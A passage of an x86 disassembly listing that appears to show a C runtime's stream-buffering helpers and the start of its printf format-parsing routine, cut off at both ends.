  40169b:	8b 08                	mov    (%eax),%ecx
  40169d:	8b 11                	mov    (%ecx),%edx
  40169f:	89 55 e0             	mov    %edx,-0x20(%ebp)
  4016a2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4016a5:	50                   	push   %eax
  4016a6:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4016a9:	51                   	push   %ecx
  4016aa:	e8 31 21 00 00       	call   0x4037e0
  4016af:	83 c4 08             	add    $0x8,%esp
  4016b2:	c3                   	ret    
  4016b3:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4016b6:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4016b9:	52                   	push   %edx
  4016ba:	e8 b1 1f 00 00       	call   0x403670
  4016bf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4016c2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4016c9:	5f                   	pop    %edi
  4016ca:	5e                   	pop    %esi
  4016cb:	5b                   	pop    %ebx
  4016cc:	8b e5                	mov    %ebp,%esp
  4016ce:	5d                   	pop    %ebp
  4016cf:	c3                   	ret    
  4016d0:	55                   	push   %ebp
  4016d1:	8b ec                	mov    %esp,%ebp
  4016d3:	83 3d b8 35 42 00 02 	cmpl   $0x2,0x4235b8
  4016da:	74 05                	je     0x4016e1
  4016dc:	e8 bf 31 00 00       	call   0x4048a0
  4016e1:	8b 45 08             	mov    0x8(%ebp),%eax
  4016e4:	50                   	push   %eax
  4016e5:	e8 06 32 00 00       	call   0x4048f0
  4016ea:	83 c4 04             	add    $0x4,%esp
  4016ed:	68 ff 00 00 00       	push   $0xff
  4016f2:	ff 15 30 2a 42 00    	call   *0x422a30
  4016f8:	83 c4 04             	add    $0x4,%esp
  4016fb:	5d                   	pop    %ebp
  4016fc:	c3                   	ret    
  4016fd:	cc                   	int3   
  4016fe:	cc                   	int3   
  4016ff:	cc                   	int3   
  401700:	55                   	push   %ebp
  401701:	8b ec                	mov    %esp,%ebp
  401703:	83 3d b8 35 42 00 02 	cmpl   $0x2,0x4235b8
  40170a:	74 05                	je     0x401711
  40170c:	e8 8f 31 00 00       	call   0x4048a0
  401711:	8b 45 08             	mov    0x8(%ebp),%eax
  401714:	50                   	push   %eax
  401715:	e8 d6 31 00 00       	call   0x4048f0
  40171a:	83 c4 04             	add    $0x4,%esp
  40171d:	68 ff 00 00 00       	push   $0xff
  401722:	ff 15 94 51 42 00    	call   *0x425194
  401728:	5d                   	pop    %ebp
  401729:	c3                   	ret    
  40172a:	cc                   	int3   
  40172b:	cc                   	int3   
  40172c:	cc                   	int3   
  40172d:	cc                   	int3   
  40172e:	cc                   	int3   
  40172f:	cc                   	int3   
  401730:	55                   	push   %ebp
  401731:	8b ec                	mov    %esp,%ebp
  401733:	83 ec 08             	sub    $0x8,%esp
  401736:	53                   	push   %ebx
  401737:	56                   	push   %esi
  401738:	57                   	push   %edi
  401739:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40173d:	75 1e                	jne    0x40175d
  40173f:	68 e8 01 42 00       	push   $0x4201e8
  401744:	6a 00                	push   $0x0
  401746:	6a 41                	push   $0x41
  401748:	68 dc 01 42 00       	push   $0x4201dc
  40174d:	6a 02                	push   $0x2
  40174f:	e8 fc 12 00 00       	call   0x402a50
  401754:	83 c4 14             	add    $0x14,%esp
  401757:	83 f8 01             	cmp    $0x1,%eax
  40175a:	75 01                	jne    0x40175d
  40175c:	cc                   	int3   
  40175d:	33 c0                	xor    %eax,%eax
  40175f:	85 c0                	test   %eax,%eax
  401761:	75 d6                	jne    0x401739
  401763:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401766:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401769:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40176c:	8b 42 10             	mov    0x10(%edx),%eax
  40176f:	50                   	push   %eax
  401770:	e8 1b 52 00 00       	call   0x406990
  401775:	83 c4 04             	add    $0x4,%esp
  401778:	85 c0                	test   %eax,%eax
  40177a:	75 07                	jne    0x401783
  40177c:	33 c0                	xor    %eax,%eax
  40177e:	e9 fd 00 00 00       	jmp    0x401880
  401783:	81 7d fc 60 2a 42 00 	cmpl   $0x422a60,-0x4(%ebp)
  40178a:	75 09                	jne    0x401795
  40178c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401793:	eb 19                	jmp    0x4017ae
  401795:	81 7d fc 80 2a 42 00 	cmpl   $0x422a80,-0x4(%ebp)
  40179c:	75 09                	jne    0x4017a7
  40179e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4017a5:	eb 07                	jmp    0x4017ae
  4017a7:	33 c0                	xor    %eax,%eax
  4017a9:	e9 d2 00 00 00       	jmp    0x401880
  4017ae:	8b 0d c4 35 42 00    	mov    0x4235c4,%ecx
  4017b4:	83 c1 01             	add    $0x1,%ecx
  4017b7:	89 0d c4 35 42 00    	mov    %ecx,0x4235c4
  4017bd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4017c0:	8b 42 0c             	mov    0xc(%edx),%eax
  4017c3:	25 0c 01 00 00       	and    $0x10c,%eax
  4017c8:	85 c0                	test   %eax,%eax
  4017ca:	74 07                	je     0x4017d3
  4017cc:	33 c0                	xor    %eax,%eax
  4017ce:	e9 ad 00 00 00       	jmp    0x401880
  4017d3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4017d6:	83 3c 8d bc 35 42 00 	cmpl   $0x0,0x4235bc(,%ecx,4)
  4017dd:	00 
  4017de:	75 5a                	jne    0x40183a
  4017e0:	6a 5e                	push   $0x5e
  4017e2:	68 dc 01 42 00       	push   $0x4201dc
  4017e7:	6a 02                	push   $0x2
  4017e9:	68 00 10 00 00       	push   $0x1000
  4017ee:	e8 2d 33 00 00       	call   0x404b20
  4017f3:	83 c4 10             	add    $0x10,%esp
  4017f6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4017f9:	89 04 95 bc 35 42 00 	mov    %eax,0x4235bc(,%edx,4)
  401800:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401803:	83 3c 85 bc 35 42 00 	cmpl   $0x0,0x4235bc(,%eax,4)
  40180a:	00 
  40180b:	75 2d                	jne    0x40183a
  40180d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401810:	83 c1 14             	add    $0x14,%ecx
  401813:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401816:	89 4a 08             	mov    %ecx,0x8(%edx)
  401819:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40181c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40181f:	8b 51 08             	mov    0x8(%ecx),%edx
  401822:	89 10                	mov    %edx,(%eax)
  401824:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401827:	c7 40 18 02 00 00 00 	movl   $0x2,0x18(%eax)
  40182e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401831:	c7 41 04 02 00 00 00 	movl   $0x2,0x4(%ecx)
  401838:	eb 2f                	jmp    0x401869
  40183a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40183d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401840:	8b 0c 85 bc 35 42 00 	mov    0x4235bc(,%eax,4),%ecx
  401847:	89 4a 08             	mov    %ecx,0x8(%edx)
  40184a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40184d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401850:	8b 48 08             	mov    0x8(%eax),%ecx
  401853:	89 0a                	mov    %ecx,(%edx)
  401855:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401858:	c7 42 18 00 10 00 00 	movl   $0x1000,0x18(%edx)
  40185f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401862:	c7 40 04 00 10 00 00 	movl   $0x1000,0x4(%eax)
  401869:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40186c:	8b 51 0c             	mov    0xc(%ecx),%edx
  40186f:	81 ca 02 11 00 00    	or     $0x1102,%edx
  401875:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401878:	89 50 0c             	mov    %edx,0xc(%eax)
  40187b:	b8 01 00 00 00       	mov    $0x1,%eax
  401880:	5f                   	pop    %edi
  401881:	5e                   	pop    %esi
  401882:	5b                   	pop    %ebx
  401883:	8b e5                	mov    %ebp,%esp
  401885:	5d                   	pop    %ebp
  401886:	c3                   	ret    
  401887:	cc                   	int3   
  401888:	cc                   	int3   
  401889:	cc                   	int3   
  40188a:	cc                   	int3   
  40188b:	cc                   	int3   
  40188c:	cc                   	int3   
  40188d:	cc                   	int3   
  40188e:	cc                   	int3   
  40188f:	cc                   	int3   
  401890:	55                   	push   %ebp
  401891:	8b ec                	mov    %esp,%ebp
  401893:	51                   	push   %ecx
  401894:	53                   	push   %ebx
  401895:	56                   	push   %esi
  401896:	57                   	push   %edi
  401897:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40189b:	74 27                	je     0x4018c4
  40189d:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4018a1:	74 21                	je     0x4018c4
  4018a3:	68 f4 01 42 00       	push   $0x4201f4
  4018a8:	6a 00                	push   $0x0
  4018aa:	68 a1 00 00 00       	push   $0xa1
  4018af:	68 dc 01 42 00       	push   $0x4201dc
  4018b4:	6a 02                	push   $0x2
  4018b6:	e8 95 11 00 00       	call   0x402a50
  4018bb:	83 c4 14             	add    $0x14,%esp
  4018be:	83 f8 01             	cmp    $0x1,%eax
  4018c1:	75 01                	jne    0x4018c4
  4018c3:	cc                   	int3   
  4018c4:	33 c0                	xor    %eax,%eax
  4018c6:	85 c0                	test   %eax,%eax
  4018c8:	75 cd                	jne    0x401897
  4018ca:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4018cd:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4018d0:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4018d4:	74 49                	je     0x40191f
  4018d6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4018d9:	8b 42 0c             	mov    0xc(%edx),%eax
  4018dc:	25 00 10 00 00       	and    $0x1000,%eax
  4018e1:	85 c0                	test   %eax,%eax
  4018e3:	74 38                	je     0x40191d
  4018e5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4018e8:	51                   	push   %ecx
  4018e9:	e8 32 51 00 00       	call   0x406a20
  4018ee:	83 c4 04             	add    $0x4,%esp
  4018f1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4018f4:	8b 42 0c             	mov    0xc(%edx),%eax
  4018f7:	80 e4 ee             	and    $0xee,%ah
  4018fa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4018fd:	89 41 0c             	mov    %eax,0xc(%ecx)
  401900:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401903:	c7 42 18 00 00 00 00 	movl   $0x0,0x18(%edx)
  40190a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40190d:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401913:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401916:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  40191d:	eb 1b                	jmp    0x40193a
  40191f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401922:	8b 42 0c             	mov    0xc(%edx),%eax
  401925:	25 00 10 00 00       	and    $0x1000,%eax
  40192a:	85 c0                	test   %eax,%eax
  40192c:	74 0c                	je     0x40193a
  40192e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401931:	51                   	push   %ecx
  401932:	e8 e9 50 00 00       	call   0x406a20
  401937:	83 c4 04             	add    $0x4,%esp
  40193a:	5f                   	pop    %edi
  40193b:	5e                   	pop    %esi
  40193c:	5b                   	pop    %ebx
  40193d:	8b e5                	mov    %ebp,%esp
  40193f:	5d                   	pop    %ebp
  401940:	c3                   	ret    
  401941:	cc                   	int3   
  401942:	cc                   	int3   
  401943:	cc                   	int3   
  401944:	cc                   	int3   
  401945:	cc                   	int3   
  401946:	cc                   	int3   
  401947:	cc                   	int3   
  401948:	cc                   	int3   
  401949:	cc                   	int3   
  40194a:	cc                   	int3   
  40194b:	cc                   	int3   
  40194c:	cc                   	int3   
  40194d:	cc                   	int3   
  40194e:	cc                   	int3   
  40194f:	cc                   	int3   
  401950:	55                   	push   %ebp
  401951:	8b ec                	mov    %esp,%ebp
  401953:	81 ec a8 02 00 00    	sub    $0x2a8,%esp
  401959:	53                   	push   %ebx
  40195a:	56                   	push   %esi
  40195b:	57                   	push   %edi
  40195c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  401963:	c7 85 d4 fd ff ff 00 	movl   $0x0,-0x22c(%ebp)
  40196a:	00 00 00 
  40196d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  401974:	8b 45 0c             	mov    0xc(%ebp),%eax
  401977:	8a 08                	mov    (%eax),%cl
  401979:	88 4d d8             	mov    %cl,-0x28(%ebp)
  40197c:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  401980:	8b 45 0c             	mov    0xc(%ebp),%eax
  401983:	83 c0 01             	add    $0x1,%eax
  401986:	89 45 0c             	mov    %eax,0xc(%ebp)
  401989:	85 d2                	test   %edx,%edx
  40198b:	0f 84 d6 0b 00 00    	je     0x402567
  401991:	83 bd d4 fd ff ff 00 	cmpl   $0x0,-0x22c(%ebp)
  401998:	0f 8c c9 0b 00 00    	jl     0x402567
  40199e:	0f be 4d d8          	movsbl -0x28(%ebp),%ecx
  4019a2:	83 f9 20             	cmp    $0x20,%ecx
  4019a5:	7c 1f                	jl     0x4019c6
  4019a7:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  4019ab:	83 fa 78             	cmp    $0x78,%edx
  4019ae:	7f 16                	jg     0x4019c6
  4019b0:	0f be 45 d8          	movsbl -0x28(%ebp),%eax
  4019b4:	0f be 88 ec 01 42 00 	movsbl 0x4201ec(%eax),%ecx
  4019bb:	83 e1 0f             	and    $0xf,%ecx
  4019be:	89 8d 70 fd ff ff    	mov    %ecx,-0x290(%ebp)
  4019c4:	eb 0a                	jmp    0x4019d0
  4019c6:	c7 85 70 fd ff ff 00 	movl   $0x0,-0x290(%ebp)
  4019cd:	00 00 00 
  4019d0:	8b 95 70 fd ff ff    	mov    -0x290(%ebp),%edx
  4019d6:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4019d9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4019dc:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4019df:	0f be 94 c1 0c 02 42 	movsbl 0x42020c(%ecx,%eax,8),%edx
  4019e6:	00 
  4019e7:	c1 fa 04             	sar    $0x4,%edx
  4019ea:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4019ed:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4019f0:	89 85 6c fd ff ff    	mov    %eax,-0x294(%ebp)
  4019f6:	83 bd 6c fd ff ff 07 	cmpl   $0x7,-0x294(%ebp)
  4019fd:	0f 87 5f 0b 00 00    	ja     0x402562
  401a03:	8b 8d 6c fd ff ff    	mov    -0x294(%ebp),%ecx
  401a09:	ff 24 8d 74 25 40 00 	jmp    *0x402574(,%ecx,4)
  401a10:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401a17:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401a1a:	81 e2 ff 00 00 00    	and    $0xff,%edx
  401a20:	a1 64 2e 42 00       	mov    0x422e64,%eax
  401a25:	33 c9                	xor    %ecx,%ecx
  401a27:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  401a2b:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  401a31:	85 c9                	test   %ecx,%ecx
  401a33:	74 58                	je     0x401a8d
  401a35:	8d 95 d4 fd ff ff    	lea    -0x22c(%ebp),%edx
  401a3b:	52                   	push   %edx
  401a3c:	8b 45 08             	mov    0x8(%ebp),%eax
  401a3f:	50                   	push   %eax
  401a40:	0f be 4d d8          	movsbl -0x28(%ebp),%ecx
  401a44:	51                   	push   %ecx
  401a45:	e8 36 0c 00 00       	call   0x402680
  401a4a:	83 c4 0c             	add    $0xc,%esp
  401a4d:	8b 55 0c             	mov    0xc(%ebp),%edx
  401a50:	8a 02                	mov    (%edx),%al
  401a52:	88 45 d8             	mov    %al,-0x28(%ebp)
  401a55:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401a58:	83 c1 01             	add    $0x1,%ecx
  401a5b:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  401a5e:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  401a62:	85 d2                	test   %edx,%edx
  401a64:	75 21                	jne    0x401a87
  401a66:	68 8c 02 42 00       	push   $0x42028c
  401a6b:	6a 00                	push   $0x0
  401a6d:	68 86 01 00 00       	push   $0x186
  401a72:	68 80 02 42 00       	push   $0x420280
  401a77:	6a 02                	push   $0x2
  401a79:	e8 d2 0f 00 00       	call   0x402a50
  401a7e:	83 c4 14             	add    $0x14,%esp
  401a81:	83 f8 01             	cmp    $0x1,%eax
  401a84:	75 01                	jne    0x401a87
  401a86:	cc                   	int3   
  401a87:	33 c0                	xor    %eax,%eax
  401a89:	85 c0                	test   %eax,%eax
  401a8b:	75 d1                	jne    0x401a5e
  401a8d:	8d 8d d4 fd ff ff    	lea    -0x22c(%ebp),%ecx
  401a93:	51                   	push   %ecx
  401a94:	8b 55 08             	mov    0x8(%ebp),%edx
  401a97:	52                   	push   %edx
  401a98:	0f be 45 d8          	movsbl -0x28(%ebp),%eax
  401a9c:	50                   	push   %eax
  401a9d:	e8 de 0b 00 00       	call   0x402680
  401aa2:	83 c4 0c             	add    $0xc,%esp
  401aa5:	e9 b8 0a 00 00       	jmp    0x402562
  401aaa:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401ab1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401ab4:	89 8d c4 fd ff ff    	mov    %ecx,-0x23c(%ebp)
  401aba:	8b 95 c4 fd ff ff    	mov    -0x23c(%ebp),%edx
  401ac0:	89 95 bc fd ff ff    	mov    %edx,-0x244(%ebp)
  401ac6:	8b 85 bc fd ff ff    	mov    -0x244(%ebp),%eax
  401acc:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401acf:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401ad6:	c7 85 cc fd ff ff ff 	movl   $0xffffffff,-0x234(%ebp)
  401add:	ff ff ff 
  401ae0:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401ae7:	e9 76 0a 00 00       	jmp    0x402562
  401aec:	0f be 4d d8          	movsbl -0x28(%ebp),%ecx
  401af0:	89 8d 68 fd ff ff    	mov    %ecx,-0x298(%ebp)
  401af6:	8b 95 68 fd ff ff    	mov    -0x298(%ebp),%edx
  401afc:	83 ea 20             	sub    $0x20,%edx
  401aff:	89 95 68 fd ff ff    	mov    %edx,-0x298(%ebp)
  401b05:	83 bd 68 fd ff ff 10 	cmpl   $0x10,-0x298(%ebp)
  401b0c:	77 48                	ja     0x401b56
  401b0e:	8b 8d 68 fd ff ff    	mov    -0x298(%ebp),%ecx
  401b14:	33 c0                	xor    %eax,%eax
  401b16:	8a 81 ac 25 40 00    	mov    0x4025ac(%ecx),%al
  401b1c:	ff 24 85 94 25 40 00 	jmp    *0x402594(,%eax,4)
  401b23:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401b26:	83 ca 04             	or     $0x4,%edx
  401b29:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401b2c:	eb 28                	jmp    0x401b56
  401b2e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b31:	0c 01                	or     $0x1,%al
  401b33:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b36:	eb 1e                	jmp    0x401b56
  401b38:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b3b:	83 c9 02             	or     $0x2,%ecx
  401b3e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401b41:	eb 13                	jmp    0x401b56
  401b43:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401b46:	80 ca 80             	or     $0x80,%dl
  401b49:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401b4c:	eb 08                	jmp    0x401b56
  401b4e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b51:	0c 08                	or     $0x8,%al
  401b53:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b56:	e9 07 0a 00 00       	jmp    0x402562
  401b5b:	0f be 4d d8          	movsbl -0x28(%ebp),%ecx
  401b5f:	83 f9 2a             	cmp    $0x2a,%ecx
  401b62:	75 33                	jne    0x401b97
  401b64:	8d 55 10             	lea    0x10(%ebp),%edx
  401b67:	52                   	push   %edx
  401b68:	e8 23 0c 00 00       	call   0x402790
  401b6d:	83 c4 04             	add    $0x4,%esp
  401b70:	89 85 bc fd ff ff    	mov    %eax,-0x244(%ebp)
  401b76:	83 bd bc fd ff ff 00 	cmpl   $0x0,-0x244(%ebp)
  401b7d:	7d 16                	jge    0x401b95
  401b7f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b82:	0c 04                	or     $0x4,%al
  401b84:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b87:	8b 8d bc fd ff ff    	mov    -0x244(%ebp),%ecx
  401b8d:	f7 d9                	neg    %ecx
  401b8f:	89 8d bc fd ff ff    	mov    %ecx,-0x244(%ebp)
  401b95:	eb 17                	jmp    0x401bae
  401b97:	8b 95 bc fd ff ff    	mov    -0x244(%ebp),%edx
  401b9d:	6b d2 0a             	imul   $0xa,%edx,%edx
  401ba0:	0f be 45 d8          	movsbl -0x28(%ebp),%eax
  401ba4:	8d 4c 02 d0          	lea    -0x30(%edx,%eax,1),%ecx
  401ba8:	89 8d bc fd ff ff    	mov    %ecx,-0x244(%ebp)
  401bae:	e9 af 09 00 00       	jmp    0x402562
  401bb3:	c7 85 cc fd ff ff 00 	movl   $0x0,-0x234(%ebp)
  401bba:	00 00 00 
  401bbd:	e9 a0 09 00 00       	jmp    0x402562
  401bc2:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  401bc6:	83 fa 2a             	cmp    $0x2a,%edx
  401bc9:	75 27                	jne    0x401bf2
  401bcb:	8d 45 10             	lea    0x10(%ebp),%eax
  401bce:	50                   	push   %eax
  401bcf:	e8 bc 0b 00 00       	call   0x402790
  401bd4:	83 c4 04             	add    $0x4,%esp
  401bd7:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  401bdd:	83 bd cc fd ff ff 00 	cmpl   $0x0,-0x234(%ebp)
  401be4:	7d 0a                	jge    0x401bf0
  401be6:	c7 85 cc fd ff ff ff 	movl   $0xffffffff,-0x234(%ebp)
  401bed:	ff ff ff 
  401bf0:	eb 17                	jmp    0x401c09
  401bf2:	8b 8d cc fd ff ff    	mov    -0x234(%ebp),%ecx
  401bf8:	6b c9 0a             	imul   $0xa,%ecx,%ecx
  401bfb:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  401bff:	8d 44 11 d0          	lea    -0x30(%ecx,%edx,1),%eax
  401c03:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  401c09:	e9 54 09 00 00       	jmp    0x402562
  401c0e:	0f be 4d d8          	movsbl -0x28(%ebp),%ecx
  401c12:	89 8d 64 fd ff ff    	mov    %ecx,-0x29c(%ebp)
  401c18:	8b 95 64 fd ff ff    	mov    -0x29c(%ebp),%edx
  401c1e:	83 ea 49             	sub    $0x49,%edx
  401c21:	89 95 64 fd ff ff    	mov    %edx,-0x29c(%ebp)
  401c27:	83 bd 64 fd ff ff 2e 	cmpl   $0x2e,-0x29c(%ebp)
  401c2e:	77 6c                	ja     0x401c9c
  401c30:	8b 8d 64 fd ff ff    	mov    -0x29c(%ebp),%ecx
  401c36:	33 c0                	xor    %eax,%eax
  401c38:	8a 81 d1 25 40 00    	mov    0x4025d1(%ecx),%al
  401c3e:	ff 24 85 bd 25 40 00 	jmp    *0x4025bd(,%eax,4)
  401c45:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401c48:	83 ca 10             	or     $0x10,%edx
  401c4b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401c4e:	eb 4c                	jmp    0x401c9c
  401c50:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c53:	0f be 08             	movsbl (%eax),%ecx
  401c56:	83 f9 36             	cmp    $0x36,%ecx
  401c59:	75 20                	jne    0x401c7b
  401c5b:	8b 55 0c             	mov    0xc(%ebp),%edx
  401c5e:	0f be 42 01          	movsbl 0x1(%edx),%eax
  401c62:	83 f8 34             	cmp    $0x34,%eax
  401c65:	75 14                	jne    0x401c7b
  401c67:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401c6a:	83 c1 02             	add    $0x2,%ecx
  401c6d:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  401c70:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401c73:	80 ce 80             	or     $0x80,%dh
  401c76:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401c79:	eb 0c                	jmp    0x401c87
  401c7b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  401c82:	e9 89 fd ff ff       	jmp    0x401a10
  401c87:	eb 13                	jmp    0x401c9c
  401c89:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c8c:	0c 20                	or     $0x20,%al
  401c8e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c91:	eb 09                	jmp    0x401c9c
  401c93:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401c96:	80 cd 08             	or     $0x8,%ch
  401c99:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401c9c:	e9 c1 08 00 00       	jmp    0x402562
  401ca1:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  401ca5:	89 95 60 fd ff ff    	mov    %edx,-0x2a0(%ebp)
  401cab:	8b 85 60 fd ff ff    	mov    -0x2a0(%ebp),%eax
  401cb1:	83 e8 43             	sub    $0x43,%eax
  401cb4:	89 85 60 fd ff ff    	mov    %eax,-0x2a0(%ebp)
  401cba:	83 bd 60 fd ff ff 35 	cmpl   $0x35,-0x2a0(%ebp)
  401cc1:	0f 87 c0 06 00 00    	ja     0x402387
  401cc7:	8b 95 60 fd ff ff    	mov    -0x2a0(%ebp),%edx
  401ccd:	33 c9                	xor    %ecx,%ecx
  401ccf:	8a 8a 3c 26 40 00    	mov    0x40263c(%edx),%cl
  401cd5:	ff 24 8d 00 26 40 00 	jmp    *0x402600(,%ecx,4)
  401cdc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401cdf:	25 30 08 00 00       	and    $0x830,%eax
  401ce4:	85 c0                	test   %eax,%eax
  401ce6:	75 09                	jne    0x401cf1
  401ce8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ceb:	80 cd 08             	or     $0x8,%ch
  401cee:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401cf1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401cf4:	81 e2 10 08 00 00    	and    $0x810,%edx
  401cfa:	85 d2                	test   %edx,%edx
  401cfc:	74 39                	je     0x401d37
  401cfe:	8d 45 10             	lea    0x10(%ebp),%eax
  401d01:	50                   	push   %eax
  401d02:	e8 c9 0a 00 00       	call   0x4027d0
  401d07:	83 c4 04             	add    $0x4,%esp
  401d0a:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
  401d0e:	66 8b 4d ec          	mov    -0x14(%ebp),%cx
  401d12:	51                   	push   %ecx
  401d13:	8d 95 d8 fd ff ff    	lea    -0x228(%ebp),%edx
  401d19:	52                   	push   %edx
  401d1a:	e8 b1 4e 00 00       	call   0x406bd0
  401d1f:	83 c4 08             	add    $0x8,%esp
  401d22:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401d25:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  401d29:	7d 0a                	jge    0x401d35
  401d2b:	c7 85 c4 fd ff ff 01 	movl   $0x1,-0x23c(%ebp)
  401d32:	00 00 00 
  401d35:	eb 26                	jmp    0x401d5d
  401d37:	8d 45 10             	lea    0x10(%ebp),%eax
  401d3a:	50                   	push   %eax
  401d3b:	e8 50 0a 00 00       	call   0x402790
  401d40:	83 c4 04             	add    $0x4,%esp
  401d43:	66 89 85 b8 fd ff ff 	mov    %ax,-0x248(%ebp)
  401d4a:	8a 8d b8 fd ff ff    	mov    -0x248(%ebp),%cl
  401d50:	88 8d d8 fd ff ff    	mov    %cl,-0x228(%ebp)
  401d56:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  401d5d:	8d 95 d8 fd ff ff    	lea    -0x228(%ebp),%edx
  401d63:	89 55 e0             	mov    %edx,-0x20(%ebp)
  401d66:	e9 1c 06 00 00       	jmp    0x402387
  401d6b:	8d 45 10             	lea    0x10(%ebp),%eax
  401d6e:	50                   	push   %eax
  401d6f:	e8 1c 0a 00 00       	call   0x402790
  401d74:	83 c4 04             	add    $0x4,%esp
  401d77:	89 85 b4 fd ff ff    	mov    %eax,-0x24c(%ebp)
  401d7d:	83 bd b4 fd ff ff 00 	cmpl   $0x0,-0x24c(%ebp)
  401d84:	74 0c                	je     0x401d92
  401d86:	8b 8d b4 fd ff ff    	mov    -0x24c(%ebp),%ecx
  401d8c:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  401d90:	75 1a                	jne    0x401dac
  401d92:	8b 15 38 2a 42 00    	mov    0x422a38,%edx
  401d98:	89 55 e0             	mov    %edx,-0x20(%ebp)
  401d9b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d9e:	50                   	push   %eax
  401d9f:	e8 ec 17 00 00       	call   0x403590
